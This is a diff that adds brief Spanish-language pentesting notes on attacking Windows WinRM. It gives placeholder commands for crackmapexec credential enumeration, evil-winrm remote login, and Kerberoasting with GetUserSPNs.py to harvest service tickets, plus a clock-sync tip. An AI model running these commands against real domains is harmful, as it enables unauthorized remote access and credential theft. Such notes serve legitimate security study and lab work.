@@ -1,0 +1,15 @@
+	#### Winrm
+
+### Enumeracion
+crackmapexec winrm <ip> -u <"usr"> -p <"psw">
+#Permite enumerar el servicio winrm con las credenciales pasadas
+
+###Coneccion
+evil-winrm -i <ip> -u <"usr"> -p <"pswd">
+#Coneccion mediante usr y pswd
+
+###Kerberoasting
+GetUserSPNs.py <domain>/usr:psswd
+#Si se tienen credenciales se intenta esdto para kerberoasting attack para obtener un TGS
+#Esto devuelve un ticket en caso de ser psible.
+-> ntpdate <ip> para sincronizar la hora con la de nuestro servidor
